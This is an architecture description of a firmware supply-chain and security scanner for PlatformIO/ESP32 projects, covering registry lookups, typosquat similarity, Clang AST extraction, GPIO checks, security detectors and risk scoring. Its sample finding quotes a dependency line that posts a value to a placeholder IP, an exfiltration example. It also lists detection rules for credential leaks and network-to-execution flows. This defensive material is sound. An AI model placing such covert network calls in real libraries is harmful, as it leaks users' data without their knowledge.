# ShipSafe architecture

## Pipeline

```
 upload.zip ──► project_loader ──► platformio.ini + sources (read only, never executed)
                                        │
          ┌─────────────────────────────┼──────────────────────────────┐
          ▼                             ▼                              │
  A. PlatformIO intelligence     Clang AST engine                       │
     ini_parser                    compile_context (flags, includes,    │
     registry_client ──► API       stubs, compile_commands.json)        │
     similarity                    clang_parser (libclang 18)           │
     package_intel                 ast_extractor ──► ProjectFeatures    │
          │                         │                    │              │
          │                         ▼                    ▼              │
          │             B. hardware checker     C. security engine ◄───┘
          │                (chip profile)         (5 detectors; uses
          │                                        A's package purpose)
          └──────────────┬──────────┴────────────────────┘
                         ▼
          unified findings (models.Finding) ──► risk_engine ──► report
```

Each stage is wrapped so that a failure becomes an entry in `errors` and the remaining
stages still run. The registry client trips a circuit breaker after the first network
failure, so one outage costs one timeout, not one per dependency.

## Unified finding format

```json
{
  "component": "security_engine",
  "rule_id": "NET002",
  "category": "NETWORK_BEHAVIOUR",
  "severity": "MEDIUM",
  "file": "lib/RainGauge/src/RainGauge.cpp",
  "line": 16,
  "description": "Dependency performs network communication that its stated purpose does not explain.",
  "evidence": "http.begin(\"http://203.0.113.80/collect\"); http.POST(String ( value ))",
  "recommendation": "Review this dependency's network code ...",
  "confidence": "INDICATOR",
  "explanation": "... (RainGauge library manifest: 'Count tipping-bucket rain gauge pulses. ...')",
  "origin": "dependency:RainGauge",
  "details": {"operations": [...], "context": "..."}
}
```

`confidence` is qualitative: **DEFINITE** (a deterministic fact, e.g. datasheet says GPIO34 is
input-only and the code drives it), **INDICATOR** (a risk-associated pattern; intent needs a
human), **UNRESOLVED** (could not be decided, e.g. non-constant pin). It is not a probability.

Rule catalogs (`databases/package_rules.json`, `hardware_rules.json`, `security_rules.json`)
describe each rule: ID, category, severity, applicable feature, detection condition, required
context, explanation, recommendation, limitations, and the API lists the detector matches.
`backend/security_engine/rule_loader.py` validates them at load time. The detection logic is
Python code; the JSON is description and data, never the only implementation.

## Component A — PlatformIO intelligence

* **Extraction** (`ini_parser.py`): `[env]`/`[env:*]` inheritance, `extends`, `${section.option}`
  interpolation (`${sysenv.*}` is never read from the server), `extra_configs`, multi-line and
  comma lists, `lib_deps`, `platform`, `platform_packages`, `framework`, `lib/` folders, and
  installed packages in `.pio/libdeps/<env>` (`.piopm`, `library.json`, `library.properties`).
  Entries are classified: registry library, legacy numeric ID, framework built-in (list from the
  arduino-esp32 repository), git (with pin kind: commit / tag / branch-or-tag / unpinned), archive
  URL, local, platform, tool package, framework.
* **Registry** (`registry_client.py`): endpoints from the official OpenAPI document
  (`/v3/packages/{owner}/{type}/{name}`, `/dlstats`, `/v3/search`). The OpenAPI file has no
  response schemas, so the fields used were taken from live responses and are validated on
  every call. Timeouts, 429/503 with `Retry-After` (bounded wait, bounded retries), HTTP error
  classes, invalid-JSON detection, a TTL file cache (404s are cached too), stale-cache fallback
  and an offline mode. Absent fields are reported as `null`.
* **Trusted packages** (`scripts/verify_trusted_packages.py`): each entry is kept only if the
  registry package exists under the stated owner, its `repository_url` points at the stated
  upstream, and the GitHub repository exists (fork status recorded). Two extra publishers
  (`me-no-dev` for AsyncTCP/ESPAsyncWebServer) are accepted because their registry
  `repository_url` points to the same upstream.
* **Similarity** (`similarity.py`): normalisation (case, separators, trailing "library"),
  confusable-character skeletons (0/o, 1/l/i, rn/m, vv/w, 5/s, 3/e), Damerau-Levenshtein edit
  distance (≤1 edit up to 8 characters, ≤2 above, none under 5), short affixes (≤3 characters)
  and dropped words. Every match carries a human-readable difference ("'0' replaced by 'o'").

### Similarity calibration

`scripts/calibrate_similarity.py` searches the registry around each trusted name and compares
every returned library name (1,152 real names; results in `docs/similarity_calibration.json`):

| relation | verified publisher | other publisher |
|---|---|---|
| exact | 20 | 26 (same-name forks / ports, reported as PKG002) |
| edit | 4 (e.g. *Adafruit BME680 Library*, *Adafruit SSD1305*) | 6 (e.g. *PubSubClient3*, *TBPubSubClient*) |
| extra_words | 3 | 17 (e.g. *FastLED-IO*, *AsyncTCP_SSL*) |
| no relation | 1,076 | |

Consequences built into the rules: model-number variants by the verified publisher are not
reported; `confusable` matches are HIGH, `edit` MEDIUM, word-level matches LOW (they mostly hit
legitimate extension libraries). An earlier, looser "any extra word" rule matched 82 legitimate
libraries and was replaced.

## Component B — hardware intelligence

* `databases/esp32_wroom_32.json` is generated by `scripts/build_esp32_profile.py`, which holds
  the ESP32-WROOM-32 datasheet v3.8 Table 2 function strings verbatim (plus GPIO37/38 from the
  ESP-IDF GPIO summary). ADC/DAC/touch/RTC/JTAG/UART0 capabilities are *derived* from those
  strings. Strapping defaults come from datasheet Table 3, boot functions from sections 3.1-3.5,
  touch channels from Table 11, input-only/no-pull and ADC2/Wi-Fi from ESP-IDF.
  `tests/unit/test_hardware_profile.py` re-checks these facts and cross-checks the team's
  DevKit V1 reference file.
* `board_profiles.json` maps all 314 espressif32 board IDs to their MCU (registry boards
  endpoint). Without an explicit chip choice the profile is derived from `board =`; a board with
  another MCU gives HW011 (mismatch) or a skipped hardware stage.
* The checker receives `gpio_operations` from the AST: `pinMode`, `digitalWrite/Read`,
  `analogRead(MilliVolts)`, `analogWrite`, `dacWrite`, `touchRead`, LEDC attach, `attachInterrupt`,
  ESP-IDF `gpio_set_direction/level/pull*`, `Wire.begin/setPins`, `SPI.begin`,
  `HardwareSerial::begin/setPins`. Pin arguments are constant-folded by Clang (macros, `const`,
  `constexpr`, enums such as `GPIO_NUM_34`, build-flag defines, pin aliases like `A6`); anything
  else is UNRESOLVED (HW012). Rules HW001-HW013 compare the requested operation with the profile;
  strapping findings are contextual (INFO when read, LOW when driven, MEDIUM for GPIO12/MTDI).

## Clang AST engine

* `compile_context.py` assembles flags from data only: `compile_commands.json` if present
  (Xtensa-only flags dropped, missing include paths reported), otherwise `build_flags`
  (-D/-I), project/library include folders, and declaration-only stubs for Arduino-ESP32 and
  ESP-IDF APIs (constant values copied from arduino-esp32 sources). Target `i686-unknown-linux-gnu`
  keeps 32-bit `int`/pointer sizes.
* `clang_parser.py` parses each translation unit (src/, lib/, .pio/libdeps; examples and tests
  skipped). On "'X.h' file not found" it writes an empty X.h, records it and re-parses, so the rest
  of the file is still analysed and later errors are still reported. All errors are kept.
* `ast_extractor.py` walks only nodes located in the project, and records function declarations,
  calls (resolved declaration, class, object type and base classes, arguments with source text,
  constant value and referenced variables), object and variable declarations, string literals,
  assignments, array initialisers, data-to-function-pointer casts, indirect and unresolved calls,
  macro definitions, includes and GPIO operations — each with file, line and enclosing function.

## Component C — security engine

| Detector | Rules | Key context |
|---|---|---|
| network | NET001-NET005 | origin (project/dependency) and the dependency's stated purpose (registry description/keywords or library manifest); hardcoded endpoints; URL scheme; `setInsecure()` |
| credentials | CRED001-CRED004 | identifier names, credential API argument positions, placeholder filter, token formats, logging calls; values always redacted and scrubbed from every finding |
| execution | EXEC001-EXEC003 | interpreter/loader APIs, network-read → execution data flow, data → function pointer casts |
| firmware | FW001-FW007 | OTA is INFO; missing OTA password, plain-HTTP or unverified update download, raw flash, eFuse, boot partition switching, debug interfaces |
| obfuscation | OBF001-OBF004 | encoded literal / big array alone are INFO; decode + sensitive op (OBF003), encoded/decoded data flowing into it (OBF004) |

Data flow (`base.track`) is intra-procedural: sources (network reads, decode outputs, encoded
literals) taint variables through initialisers and assignments until a fixed point; sinks are
execution APIs, function-pointer casts and firmware/flash writes.

## Risk assessment

`risk_engine.py`: points = severity points (INFO 0, LOW 2, MEDIUM 6, HIGH 15, CRITICAL 30) ×
confidence factor (DEFINITE 1.0, INDICATOR 0.8, UNRESOLVED 0). Findings of one category on the
same line are counted once (strongest kept), repeats of a rule add 25 % each (at most 4), total
capped at 100. Bands: NONE 0, LOW ≥1, MEDIUM ≥10, HIGH ≥30, CRITICAL ≥60. The report lists every
contribution with its formula, per-component scores, merged locations, and `completeness`
(PARTIAL when the registry was unavailable, hardware was skipped or mismatched, or parser issues
occurred). The score expresses review priority only.

## Safety of the scanner itself

ZIP-only uploads (extension + magic bytes), 25 MB upload limit, entry/size/compression-ratio
limits, byte counting during extraction, rejection of absolute paths, drive letters, `..`,
Windows reserved names, symlinks and encrypted entries, per-scan temporary folders deleted after
every scan, file-count/size/time limits for parsing, and no execution of anything from the upload.
